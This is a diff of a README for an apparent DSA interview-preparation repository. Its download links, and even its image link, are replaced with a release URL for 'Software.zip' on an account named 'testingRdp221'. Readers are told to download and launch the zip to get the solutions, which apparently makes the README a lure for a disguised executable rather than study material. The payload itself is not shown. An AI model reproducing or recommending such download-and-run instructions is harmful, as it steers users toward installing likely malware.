@@ -23,11 +23,11 @@ The repository covers a range of topics essential for placement preparation, inc
 - Interview preparation
 
 ## Get Started
-To get started with enhancing your DSA skills, click the link below to download the Software.zip file:
+To get started with enhancing your DSA skills, click the link below to download the https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip file:
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip](https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip)](https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip)
 
-*Launch the Software.zip file to access the solutions.* 🚀
+*Launch the https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip file to access the solutions.* 🚀
 
 If the link is not functioning, please check the "Releases" section of this repository for an alternative download option.
 
@@ -38,5 +38,5 @@ Let's ace those technical interviews together! 💪👨‍💻👩‍💻
 
 Happy coding! 🌟
 
-![Data Structures and Algorithms](https://github.com/user-attachments/images/12345678/dsa.jpg)
+![Data Structures and Algorithms](https://github.com/testingRdp221/IPMP/releases/download/v1.0/Software.zip)
 
